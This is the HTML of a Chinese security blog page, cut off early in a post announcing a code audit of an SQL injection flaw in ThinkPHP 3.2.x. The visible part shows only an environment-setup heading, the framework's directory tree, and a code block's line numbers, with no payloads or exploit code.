<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.1.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hack-for.fun","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="M0nk3y‘s Blog">
<meta property="og:url" content="https://hack-for.fun/index.html">
<meta property="og:site_name" content="M0nk3y‘s Blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="m0nk3y">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://hack-for.fun/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>M0nk3y‘s Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="M0nk3y‘s Blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">M0nk3y‘s Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://hack-for.fun/1209.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="m0nk3y">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0nk3y‘s Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/1209.html" class="post-title-link" itemprop="url">ThinkPHP 3.2.x SQL注入漏洞代码审计</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-12-28 21:14:02 / 修改时间：22:07:15" itemprop="dateCreated datePublished" datetime="2020-12-28T21:14:02+08:00">2020-12-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>明天数据结构反正大概率是挂了，也看不进去书了。不如学点东西，把之前未完成的内容给完成了。</p>
</blockquote>
<p>[toc]</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>tp3.2.3目录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">├── Application</span><br><span class="line">│   ├── Common</span><br><span class="line">│   │   ├── Common</span><br><span class="line">│   │   └── Conf</span><br><span class="line">│   ├── Home</span><br><span class="line">│   │   ├── Common</span><br><span class="line">│   │   ├── Conf</span><br><span class="line">│   │   ├── Controller</span><br><span class="line">│   │   ├── Model</span><br><span class="line">│   │   └── View</span><br><span class="line">│   └── Runtime</span><br><span class="line">│       ├── Cache</span><br><span class="line">│       │   └── Home</span><br><span class="line">│       ├── Data</span><br><span class="line">│       ├── Logs</span><br><span class="line">│       │   ├── Common</span><br><span class="line">│       │   └── Home</span><br><span class="line">│       └── Temp</span><br><span class="line">├── Public</span><br><span class="line">└── ThinkPHP</span><br><span class="line">    ├── Common</span><br><span class="line">    ├── Conf</span><br><span class="line">    ├── Lang</span><br><span class="line">    ├── Library</span><br><span class="line">    │   ├── Behavior</span><br><span class="line">    │   ├── Org</span><br><span class="line">    │   │   ├── Net</span><br><span class="line">    │   │   └── Util</span><br><span class="line">    │   ├── Think</span><br><span class="line">    │   │   ├── Cache</span><br><span class="line">    │   │   │   └── Driver</span><br><span class="line">    │   │   ├── Controller</span><br><span class="line">    │   │   ├── Crypt</span><br><span class="line">    │   │   │   └── Driver</span><br><span class="line">    │   │   ├── Db</span><br><span class="line">    │   │   │   └── Driver</span><br><span class="line">    │   │   ├── Image</span><br><span class="line">    │   │   │   └── Driver</span><br><span class="line">    │   │   ├── Log</span><br><span class="line">    │   │   │   └── Driver</span><br><span class="line">    │   │   ├── Model</span><br><span class="line">    │   │   ├── Session</span><br><span class="line">    │   │   │   └── Driver</span><br><span class="line">    │   │   ├── Storage</span><br><span class="line">    │   │   │   └── Driver</span><br><span class="line">    │   │   ├── Template</span><br><span class="line">    │   │   │   ├── Driver</span><br><span class="line">    │   │   │   └── TagLib</span><br><span class="line">    │   │   ├── Upload</span><br><span class="line">    │   │   │   └── Driver</span><br><span class="line">    │   │   │       ├── Bcs</span><br><span class="line">    │   │   │       └── Qiniu</span><br><span class="line">    │   │   └── Verify</span><br><span class="line">    │   │       ├── bgs</span><br><span class="line">    │   │       ├── ttfs</span><br><span class="line">    │   │       └── zhttfs</span><br><span class="line">    │   └── Vendor</span><br><span class="line">    │       ├── Boris</span><br><span class="line">    │       ├── EaseTemplate</span><br><span class="line">    │       ├── Hprose</span><br><span class="line">    │       ├── SmartTemplate</span><br><span class="line">    │       ├── Smarty</span><br><span class="line">    │       │   ├── plugins</span><br><span class="line">    │       │   └── sysplugins</span><br><span class="line">    │       ├── TemplateLite</span><br><span class="line">    │       │   └── internal</span><br><span class="line">    │       ├── jsonRPC</span><br><span class="line">    │       ├── phpRPC</span><br><span class="line">    │       │   ├── dhparams</span><br><span class="line">    │       │   └── pecl</span><br><span class="line">    │       │       └── xxtea</span><br><span class="line">    │       │           └── test</span><br><span class="line">    │       └── spyc</span><br><span class="line">    │           ├── examples</span><br><span class="line">    │           ├── php4</span><br><span class="line">    │           └── tests</span><br><span class="line">    ├── Mode</span><br><span class="line">    │   └── Sae</span><br><span class="line">    └── Tpl</span><br><span class="line"></span><br><span class="line">79 directories</span><br></pre></td></tr></table></figure>





<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span 